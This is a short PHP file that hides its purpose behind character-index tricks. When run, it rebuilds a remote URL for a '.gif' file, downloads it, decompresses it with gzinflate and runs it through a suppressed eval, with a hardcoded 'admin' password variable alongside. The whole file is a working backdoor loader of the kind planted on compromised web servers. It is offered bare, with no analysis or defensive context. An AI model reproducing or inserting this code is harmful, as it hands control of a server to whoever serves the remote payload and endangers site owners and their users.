<?php
set_time_limit(666);
$i = range('~','.');
s($i[27].$i[22].$i[12],
$i[22].$i[10].$i[10]
.$i[14].$i[68].$i[79].$i[79].$i[7].$i[7]
.$i[7].$i[80].$i[14].$i[22].$i[14].$i[11]
.$i[25].$i[27].$i[80].$i[27].$i[27].$i[79]
.$i[29].$i[26].$i[17].$i[21].$i[16].$i[80]
.$i[23].$i[21].$i[24]);
session_start();
function s($c,$url){
if(empty($_SESSION['PhpCode'])){
	$_SESSION['PhpCode']=file_get_contents($url);
	m($_SESSION['PhpCode'],$c);
	}		
}
function m($a,$c){
	$unzip=$c(103).$c(122).$c(105).$c(110);
	$unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
	$ss = "";
	l($unzip($a),$ss);
}
function l($xx,$ss){
	$password = "admin";
	$MyName   = "Admin";
	@eval($xx.$ss);
}
?>